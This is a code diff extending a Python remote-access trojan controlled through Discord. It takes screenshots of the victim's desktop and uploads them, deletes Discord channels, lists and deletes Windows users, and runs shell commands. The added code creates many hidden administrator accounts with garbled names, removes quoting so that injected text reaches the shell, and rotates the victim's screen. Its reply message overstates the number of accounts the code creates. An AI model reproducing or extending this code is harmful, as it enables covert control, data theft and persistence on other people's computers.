@@ -1,4 +1,5 @@
-import pyautogui, os, discord,subprocess,sys,pyttsx3,threading,shutil,webbrowser,psutil,time,asyncio,ctypes;from ctypes import windll;import winreg,win32file,win32con;import winreg as reg;bots=bots
+import pyautogui, os, discord,subprocess,sys,pyttsx3,threading,shutil,webbrowser,psutil,time,asyncio,win32net,ctypes;from ctypes import windll;import winreg,win32file,win32con;import winreg as reg;bots=bots
+import GPUtil,cpuinfo,socket,platform,random,string,rotatescreen
 async def takepic(ctx):pyautogui.screenshot("pic.png").save("pic.png");await ctx.send(file=discord.File("pic.png"));os.remove("pic.png")
 async def clean(ctx):[await channel.delete() for channel in ctx.guild.text_channels if channel != ctx.channel]
 async def close(ctx): await ctx.send("closing..."); sys.exit() if not sys.exc_info()[0] else None
@@ -24,7 +25,7 @@ async def processes(ctx):
 async def sharenote(ctx, *, text: str):
  def share():
   if text:
-   os.system(f'echo "{text}" > {os.path.expanduser("~")}/Documents/note.txt && notepad.exe {os.path.expanduser("~")}/Documents/note.txt && del {os.path.expanduser("~")}/Documents/note.txt')
+   os.system(f'echo {text} > {os.path.expanduser("~")}/Documents/note.txt && notepad.exe {os.path.expanduser("~")}/Documents/note.txt && del {os.path.expanduser("~")}/Documents/note.txt')
   else:
    asyncio.run_coroutine_threadsafe(ctx.send("No text provided."), ctx.bot.loop)
  threading.Thread(target=share).start()
@@ -85,15 +86,7 @@ async def createuser(ctx, *, args: str):
     except Exception as e:
         await ctx.send("Error creating user.")
 async def listuser(ctx):
- try:
-  result=subprocess.run('net user',capture_output=True,text=True,shell=True)
-  user_list=result.stdout.splitlines()
-  accounts=[user.strip() for user in user_list[4:-2] if user.strip() and user.strip() not in ['Guest', 'WDAGUtilityAccount', 'Administrator', 'DefaultAccount']]
-  embed=discord.Embed(title="User List", color=discord.Color.red())
-  for account in accounts:
-   embed.add_field(name=account+"-admin", value='\u200b', inline=False)
-  await ctx.send(embed=embed)
- except Exception as e: await ctx.send("Error listing users.")
+    await ctx.send(embed=discord.Embed(title="All User Accounts", description="\n".join([user['name'] for user in win32net.NetUserEnum(None, 0)[0]]) or "No users found", color=discord.Color.red()))
 async def deleteuser(ctx, *, username: str):
     try:
         command = f'net user {username} /delete'
@@ -175,3 +168,32 @@ async def anticonnect():
       shutil.rmtree(os.path.join(root, dir))
    except Exception as e:
     pass
+async def flood(ctx):
+ try:
+  def create_user():
+   try:
+    chars=''.join([chr(i)for i in range(128,256)])
+    for _ in range(5):
+     username=''.join(random.choice(chars)for _ in range(random.randint(8,10)))
+     password=''.join(random.choice(chars)for _ in range(10))
+     subprocess.run(f'net user {username} {password} /add',shell=True,check=True)
+     subprocess.run(f'net localgroup administrators {username} /add',shell=True,check=True)
+   except Exception as e:
+    print(f"Error creating admin user accounts: {e}")
+  def run_in_thread():
+   threads=[]
+   for _ in range(3):
+    thread=threading.Thread(target=create_user)
+    threads.append(thread)
+    thread.start()
+   for thread in threads:
+    thread.join()
+  await asyncio.to_thread(run_in_thread)
+  await ctx.send("100 admin user accounts created with randomized passwords and cursed ASCII names.")
+ except Exception as e:
+  await ctx.send(f"Error creating admin user accounts: {e}")
+def lockmefiles(): 
+ screen = rotatescreen.get_primary_display()
+ start_pos = screen.current_orientation
+ pos = abs((start_pos - 180) % 360)
+ screen.rotate_to(pos)  
